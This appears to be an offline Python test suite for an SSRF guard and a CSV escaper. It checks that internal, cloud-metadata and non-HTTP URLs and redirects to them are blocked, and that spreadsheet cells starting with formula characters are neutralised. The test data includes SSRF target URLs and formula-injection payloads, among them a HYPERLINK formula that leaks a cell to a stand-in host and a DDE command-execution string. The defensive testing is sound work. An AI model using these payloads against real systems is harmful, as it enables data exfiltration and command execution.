"""Offline tests for the SSRF guard and the output escaper.

No network, no Docker, no pytest. Run:  python3 -I tests/test_security.py
"""
from __future__ import annotations

import os
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from core.safe_fetch import Blocked, Result, fetch, validate   # noqa: E402
from core.sanitize import csv_cell                             # noqa: E402

PASS = FAIL = 0


def check(name, fn):
    global PASS, FAIL
    try:
        fn()
    except AssertionError as e:
        FAIL += 1
        print(f"  FAIL  {name}\n          {e}")
    except Exception as e:                       # noqa: BLE001
        FAIL += 1
        print(f"  ERROR {name}\n          {type(e).__name__}: {e}")
    else:
        PASS += 1
        print(f"  ok    {name}")


def resolver(mapping):
    """A stub DNS resolver, so the guard is tested without touching the network."""
    def resolve(host, port, **_kw):
        if host not in mapping:
            raise socket.gaierror(socket.EAI_NONAME, "name not known")
        out = []
        for ip in mapping[host]:
            fam = socket.AF_INET6 if ":" in ip else socket.AF_INET
            out.append((fam, socket.SOCK_STREAM, 6, "", (ip, port)))
        return out
    return resolve


def blocks(url, mapping=None, **kw):
    """Assert the URL is refused."""
    res = resolver(mapping or {})
    def run():
        try:
            validate(url, resolve=res, **kw)
        except Blocked:
            return
        raise AssertionError(f"expected Blocked for {url}")
    return run


def allows(url, mapping):
    res = resolver(mapping)
    def run():
        t = validate(url, resolve=res)
        assert t.ip, f"no pinned ip for {url}"
    return run


print("\nSSRF guard — scheme and authority")
for url in ("file:///etc/passwd", "ftp://example.com/x", "gopher://example.com",
            "jar:http://example.com!/", "data:text/html,<b>x",
            "http://user:pw@example.com/", "http://example.com:22/",
            "http://example.com:8080/", "http:///nohost"):
    check(url, blocks(url, {"example.com": ["93.184.216.34"]}))

print("\nSSRF guard — literal internal addresses")
INTERNAL = {
    "http://127.0.0.1/": {},
    "http://127.1/": {},
    "http://0.0.0.0/": {},
    "http://10.1.2.3/": {},
    "http://172.16.5.4/": {},
    "http://192.168.1.1/": {},
    "http://169.254.169.254/latest/meta-data/": {},   # cloud metadata
    "http://100.64.0.1/": {},                          # CGNAT
    "http://198.18.0.1/": {},
    "http://[::1]/": {},
    "http://[fe80::1]/": {},
    "http://[fc00::1]/": {},
    "http://[::ffff:127.0.0.1]/": {},                  # v4-mapped loopback
    "http://[::ffff:169.254.169.254]/": {},            # v4-mapped metadata
    "http://[2002:a9fe:a9fe::]/": {},                  # 6to4-wrapped metadata
}
for url, mapping in INTERNAL.items():
    check(url, blocks(url, mapping))

print("\nSSRF guard — hostnames that resolve inward")
check("localhost -> 127.0.0.1", blocks("http://localhost/", {"localhost": ["127.0.0.1"]}))
check("rebind.test -> 127.0.0.1", blocks("http://rebind.test/", {"rebind.test": ["127.0.0.1"]}))
check("meta.test -> 169.254.169.254", blocks("http://meta.test/", {"meta.test": ["169.254.169.254"]}))
check("mixed answers (public + loopback) refused",
      blocks("http://mixed.test/", {"mixed.test": ["93.184.216.34", "127.0.0.1"]}))
check("unresolvable host", blocks("http://nope.invalid/", {}))

print("\nSSRF guard — legitimate targets still pass")
check("http public", allows("http://example.com/", {"example.com": ["93.184.216.34"]}))
check("https public", allows("https://example.com/contact", {"example.com": ["93.184.216.34"]}))
check("https public v6", allows("https://v6.test/", {"v6.test": ["2606:2800:220:1:248:1893:25c8:1946"]}))
check("query preserved", lambda: (
    lambda t: (
        None if t.path == "/a?b=c" else (_ for _ in ()).throw(
            AssertionError(f"path/query lost: {t.path!r}")))
    )(validate("https://example.com/a?b=c", resolve=resolver({"example.com": ["93.184.216.34"]}))))
check("connection is pinned to the validated ip", lambda: (
    lambda t: (
        None if t.ip == "93.184.216.34" and t.host == "example.com"
        else (_ for _ in ()).throw(AssertionError(f"pin wrong: {t}")))
    )(validate("https://example.com/", resolve=resolver({"example.com": ["93.184.216.34"]}))))

print("\nSSRF guard — redirect handling (the hole in the reference kit)")
PUBLIC = resolver({"example.com": ["93.184.216.34"], "meta.test": ["169.254.169.254"]})


def hop_to(location):
    """A stub transport that answers every hop with one 302 to `location`."""
    def request(_target, **_kw):
        return 302, location, "text/html", "", False
    return request


def test_redirect_to_metadata_blocked():
    try:
        fetch("http://example.com/", resolve=PUBLIC,
              request=hop_to("http://169.254.169.254/latest/meta-data/"))
    except Blocked:
        return
    raise AssertionError("redirect to metadata was not blocked")


def test_redirect_to_loopback_blocked():
    try:
        fetch("http://example.com/", resolve=PUBLIC, request=hop_to("http://127.0.0.1:80/"))
    except Blocked:
        return
    raise AssertionError("redirect to loopback was not blocked")


def test_redirect_to_internal_hostname_blocked():
    try:
        fetch("http://example.com/", resolve=PUBLIC, request=hop_to("http://meta.test/"))
    except Blocked:
        return
    raise AssertionError("redirect to inward-resolving host was not blocked")


def test_redirect_scheme_downgrade_blocked():
    try:
        fetch("https://example.com/", resolve=PUBLIC, request=hop_to("file:///etc/passwd"))
    except Blocked:
        return
    raise AssertionError("redirect to file:// was not blocked")


def test_redirect_loop_capped():
    try:
        fetch("http://example.com/", resolve=PUBLIC, request=hop_to("http://example.com/next"))
    except Blocked as e:
        assert "redirect" in str(e), f"wrong error: {e}"
        return
    raise AssertionError("redirect loop was not capped")


def test_relative_redirect_resolves_and_passes():
    seen = []

    def request(target, **_kw):
        seen.append(target.url)
        if len(seen) == 1:
            return 302, "/contact", "text/html", "", False
        return 200, None, "text/html", "<html>ok</html>", False

    r = fetch("http://example.com/", resolve=PUBLIC, request=request)
    assert isinstance(r, Result) and r.status == 200, f"bad result: {r}"
    assert seen[1].endswith("/contact"), f"relative redirect mishandled: {seen}"


for fn in (test_redirect_to_metadata_blocked, test_redirect_to_loopback_blocked,
           test_redirect_to_internal_hostname_blocked, test_redirect_scheme_downgrade_blocked,
           test_redirect_loop_capped, test_relative_redirect_resolves_and_passes):
    check(fn.__name__.replace("test_", "").replace("_", " "), fn)

print("\nSSRF guard — response caps")


def test_body_truncated_at_cap():
    def request(_t, *, max_bytes, **_kw):
        raw = b"x" * (max_bytes + 5000)
        return 200, None, "text/html", raw[:max_bytes].decode(), True
    r = fetch("http://example.com/", resolve=PUBLIC, request=request, max_bytes=1000)
    assert r.truncated and len(r.text) == 1000, f"cap not applied: {len(r.text)}"


def test_binary_not_read():
    def request(_t, **_kw):
        return 200, None, "application/zip", "", False
    r = fetch("http://example.com/x", resolve=PUBLIC, request=request)
    assert r.text == "" and r.content_type == "application/zip", f"read a binary: {r}"


check("body truncated at cap", test_body_truncated_at_cap)
check("binary content not read", test_binary_not_read)

print("\nCSV formula injection")
CASES = [
    ('=HYPERLINK("http://evil.test?x="&A1,"Click")', "'="),
    ("=cmd|' /C calc'!A0", "'="),
    ("+1 512-555-0101", "'+"),
    ("-2+3", "'-"),
    ("@SUM(A1:A9)", "'@"),
    ("\t=1+1", "'\t"),
    ("\r=1+1", "'\r"),
    ("Joe's Coffee", "Jo"),
    ("", ""),
    ("4.7", "4."),
]
for raw, want_prefix in CASES:
    def run(raw=raw, want=want_prefix):
        got = csv_cell(raw)
        assert got.startswith(want), f"csv_cell({raw!r}) -> {got!r}, wanted prefix {want!r}"
        if raw and raw[0] in "=+-@\t\r\n":
            assert got[0] == "'", f"{raw!r} not neutralized"
    check(f"csv_cell({raw!r:42})", run)
check("csv_cell(None) is empty", lambda: (_ for _ in ()).throw(
    AssertionError("None not handled")) if csv_cell(None) != "" else None)

print(f"\n{PASS} passed, {FAIL} failed\n")
sys.exit(1 if FAIL else 0)
